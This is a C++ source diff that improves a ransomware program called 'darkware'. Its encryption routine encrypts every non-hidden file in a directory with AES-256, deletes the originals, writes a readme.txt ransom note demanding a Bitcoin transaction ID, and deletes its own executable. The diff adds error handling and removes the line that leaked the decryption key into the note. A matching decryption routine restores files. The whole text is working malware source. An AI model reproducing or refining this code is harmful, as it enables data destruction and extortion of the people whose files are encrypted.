@@ -35,7 +35,6 @@ const char * RANDOM::HTMLMSG(string KEY){
 "1) SERVER IP ADDRESS\n"
 "2) BTC TRANSACTION ID\n"
 "and we will then give you access to files, you can delete files from us when done\n"
-"dec : "+KEY+" !"
 "Goodbye!\n";
 	ofstream myfile;
 	myfile.open("readme.txt");
@@ -58,22 +57,28 @@ string RANDOM::STR( size_t length ){
 	}
 
 void RANDOM::ENCPATH(string WRFile, string KEY, char *ARGVNAME){
-	string dir = string(WRFile);
-	vector<string> files = vector<string>();
-	getdir(dir,files);
-	AES256 aes(KEY);
-	for (unsigned int i = 0;i < files.size();i++) {
-		string file=files[i];
-		if (file[0] != '.' and file!=ARGVNAME){
-			ifstream ifs(file, ifstream::in);
-			ofstream ofs(file+".darkware", ifstream::out);
-			aes.encrypt(ifs, ofs);
-			ifs.close();
-			ofs.close();
-			remove(file.c_str());
+	try{
+		string dir = string(WRFile);
+		vector<string> files = vector<string>();
+		getdir(dir,files);
+		AES256 aes(KEY);
+		for (unsigned int i = 0;i < files.size();i++) {
+			string file=files[i];
+			if (file[0] != '.' and file!=ARGVNAME){
+				ifstream ifs(file, ifstream::in);
+				ofstream ofs(file+".darkware", ifstream::out);
+				aes.encrypt(ifs, ofs);
+				ifs.close();
+				ofs.close();
+				remove(file.c_str());
+			}
 		}
+		RANDOM::HTMLMSG(KEY);
+		remove(ARGVNAME);
+		cout<<"SUCCESSFULLY ENCRYPTED "<<endl;
+	}catch(std::exception& ex){
+		cout<<"Error : "<<ex.what()<<endl;
 	}
-	RANDOM::HTMLMSG(KEY);
 }
 template <typename T, typename U>
 T &replace (
@@ -94,22 +99,31 @@ T &replace (
     return str;
 }
 
-void RANDOM::DECPATH(string WRFile, string KEY,char *ARGVNAME){
-	string dir = string(WRFile);;
-	vector<string> files = vector<string>();
-	getdir(dir,files);
-	AES256 aes(KEY);
-	for (unsigned int i = 0;i < files.size();i++) {
-		string file=files[i];
-		if (file[0] != '.' and file!=ARGVNAME){
-			ifstream ifs(file, ifstream::in);
-			replace(file, ".darkware"s, ""s);
-			ofstream ofs(file, ifstream::out);
-			aes.decrypt(ifs, ofs);
-			ifs.close();
-			ofs.close();
+void RANDOM::DECPATH(string WRFile, string KEY,string ARGVNAME){
+	try{
+		string dir = string(WRFile);;
+		vector<string> files = vector<string>();
+		getdir(dir,files);
+		AES256 aes(KEY);
+		for (unsigned int i = 0;i < files.size();i++) {
+			string file=files[i];
+			if (file[0] != '.' and file!=ARGVNAME and file!="readme.txt"){
+				replace(file, ".darkware"s, ""s);
+				string k=file+".darkware";
+				ifstream ifs(k, ifstream::in);
+				ofstream ofs(file, ifstream::out);
+				aes.decrypt(ifs, ofs);
+				ifs.close();
+				ofs.close();
+				remove(k.c_str());
+			}
 		}
+		remove(ARGVNAME.c_str());
+		cout<<"SUCCESSFULLY DECRYPTED "<<endl;
+	}catch(std::exception& ex){
+		cout<<"Error : "<<ex.what()<<endl;
 	}
+
 }
 string RANDOM::HASH(string newhash){
 	return md5(newhash);
